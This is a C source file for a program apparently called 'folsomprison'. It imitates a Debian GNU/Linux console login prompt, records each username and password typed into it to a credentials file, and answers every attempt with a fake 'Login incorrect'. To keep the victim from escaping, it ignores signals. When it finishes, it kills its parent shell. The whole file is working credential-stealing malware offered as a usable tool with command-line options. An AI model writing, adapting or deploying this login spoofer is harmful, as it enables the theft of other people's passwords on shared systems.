#include<stdio.h>
#include<signal.h>
#include<unistd.h>
#include<string.h>
#include<stdlib.h>
#include<fcntl.h>
#include<time.h>

#define MAX_INPUT_LENGTH 32
#define MAX_HOSTNAME_LENGTH 64
#define STDOUT_FD 1

char host[MAX_HOSTNAME_LENGTH];
char* tty;
/**
 * gets user's credentials and stores them into the specified file
 *
 * args:
 *  filepath - the path for the credentials to be stored
 *             if NULL use "./credentials"
 * 
 * return values:
 *  0 - completed successfully
 *  1 - supplied username is empty or EOF
 * -1 - could not open file
 */
int get_credentials(char* filepath)
{
  char *pass = NULL;
  char user[MAX_INPUT_LENGTH];
  char timestamp[32];
  int fd = 0;
  
  if (filepath == NULL)
    filepath = "./credentials";

  printf("\nDebian GNU/Linux 7 %s (%s)\n\n", host, tty+5);


  fd = open(filepath, O_RDWR | O_CREAT | O_APPEND, 0600);
  if(fd == -1)
    {
      fprintf(stderr, "Could not append to store file!\nExiting\n");
      perror("open");
      return -1;
    }
  printf("%s login: ",host);
  fgets(user, MAX_INPUT_LENGTH, stdin);

  // if EOF or no username supplied
  if (!strncmp("\n",user, 1) || user[0] == '\0')
    {
      close(fd);
      return 1;
    }

  // logging timestamp
  time_t rawtime;
  struct tm *timeinfo = NULL;
  time(&rawtime);
  timeinfo = localtime(&rawtime);
  sprintf(timestamp, "[%02d-%02d-%04d %02d:%02d:%02d]\n\n",
	  timeinfo->tm_mday,
	  timeinfo->tm_mon,
	  timeinfo->tm_year + 1900,
	  timeinfo->tm_hour,
	  timeinfo->tm_min,
	  timeinfo->tm_sec);
  write(fd, (const void *)timestamp, strlen(timestamp+1));

  // getting and logging credentials
  write(fd, "login: ", strlen("login: ")+1);
  write(fd, (const void *)user, strlen(user)+1);
  // TODO: getpass is deprecated, remove in the future
  pass = getpass("Password: ");
  write(fd, "pass: ", strlen("pass: ")+1);
  write(fd, (const void *)pass, strlen(pass)+1);
  write(fd, "\n\n", 2);
  
  free(pass);
  close(fd);
  return 0;
}

/**
 * Displays usage message
 */
void usage()
{
  printf("Usage:\n"
	 "folsomprison [-f file] [-h]\n"
	 "\nOptions:\n"
	 " -f\tWhere to store the credentials.\n"
	 " -h\tThis message.\n"
	 );
  exit(EXIT_FAILURE);
}

int main(int argc, char *argv[])
{
  char* filepath = NULL;
  int opt = 0;
  int ret = 0; 

  while((opt = getopt(argc, argv, "f:h")) !=-1)
    {
      switch(opt){
      case 'f':
	filepath = strdup(optarg);
	break;
      case 'h':
      default:
	usage();
      }
    }

  // ignore signals
  for (int i = 0; i<31; ++i)
    signal(i, SIG_IGN);

  // prepare to print prompt
  tty = (char *) ttyname(STDOUT_FD);
  gethostname(host, MAX_HOSTNAME_LENGTH);
  system("clear");

  // mimic original behaviour when no username is supplied
  do
    {
      // TODO: fix (uname)

      ret = get_credentials(filepath);

      if (ret == 0)
	{
	  sleep(2);
	  printf("Login incorrect\n");
	}
      else if (ret == 1) continue;
      else if (ret == -1) break;
    }while(ret);

  // logout user after done
  kill(getppid(), SIGKILL);
  return 0;
 }
